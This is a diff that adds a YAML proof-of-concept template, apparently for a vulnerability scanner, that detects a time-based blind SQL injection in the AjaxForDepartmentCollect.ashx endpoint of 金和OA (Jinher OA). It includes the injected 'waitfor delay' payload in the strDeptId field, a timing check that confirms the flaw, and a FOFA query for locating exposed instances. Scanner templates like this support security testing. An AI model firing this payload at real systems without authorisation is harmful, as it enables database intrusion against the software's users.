@@ -1,0 +1,29 @@
+id: poc-yaml-jinher-jhsoft-ajaxfordepartmentcollect-aspx-sqli
+info:
+  name: 金和OA AjaxForDepartmentCollect.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: strType=getHistoryList&strDeptId=1;waitfor+delay%270:0:{{.t1}}%27--&strCollectType=Department&strYear=2012
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"没有汇总记录") &&
+
+    !contains(body,"<html") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
